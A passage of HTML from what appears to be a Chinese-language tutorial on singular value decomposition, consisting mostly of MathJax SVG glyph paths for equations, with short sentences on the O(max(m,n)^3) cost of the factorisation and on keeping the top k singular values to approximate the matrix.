0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mi" transform="translate(12221.9, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mo" transform="translate(13268.7, 0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z"></path></g><g data-mml-node="mi" transform="translate(14546.4, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(15296.4, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mo" transform="translate(16343.2, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(17399, 0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(18166, 0)"><path data-c="3A3" d="M666 247Q664 244 652 126T638 4V0H351Q131 0 95 0T57 5V6Q54 12 57 17L73 36Q89 54 121 90T182 159L305 299L56 644L55 658Q55 677 60 681Q63 683 351 683H638V679Q640 674 652 564T666 447V443H626V447Q618 505 604 543T559 605Q529 626 478 631T333 637H294H189L293 494Q314 465 345 422Q400 346 400 340Q400 338 399 337L154 57Q407 57 428 58Q476 60 508 68T551 83T575 103Q595 125 608 162T624 225L626 251H666V247Z"></path></g><g data-mml-node="mo" transform="translate(19165.8, 0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z"></path></g><g data-mml-node="mi" transform="translate(20443.5, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="msub" transform="translate(21193.5, 0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(22250.3, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(23306, 0)"><g data-mml-node="mi"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mi" transform="translate(571, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msub" transform="translate(24171, 0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(25314.7, 0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z"></path></g><g data-mml-node="msub" transform="translate(26592.5, 0)"><g data-mml-node="mi"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mi" transform="translate(571, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(27735.2, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(28791, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="msub" transform="translate(29541, 0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(30320, 0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="msub" transform="translate(30820, 0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1278 -820.9 1 1141.7"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-7" transform="translate(0, -70.9)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(389, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(889, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>此时矩阵分解的复杂度为<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="15.867ex" height="2.451ex" role="img" focusable="false" viewBox="0 -833.2 7013.2 1083.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(1152, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1541, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2419, 0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(2948, 0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(3520, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3909, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(4787, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5231.7, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="msup" transform="translate(5831.7, 0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mn" transform="translate(389, 363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(6624.2, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span></p>
<p>通常在实际计算时会舍弃很多奇异值，用前k大的k个奇异值来近似估计原矩阵，此时维度降为k</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 50.79ex"><svg style="vertical-align: -0.743ex; min-width: 50.79ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="2.618ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -828.6)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2078, 0) translate(-2078, 0)"><g transform="translate(0 828.6) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="9146.6 -828.6 1 1157.2"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, -63.1)"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="TeXAtom" transform="translate(750, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(878, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 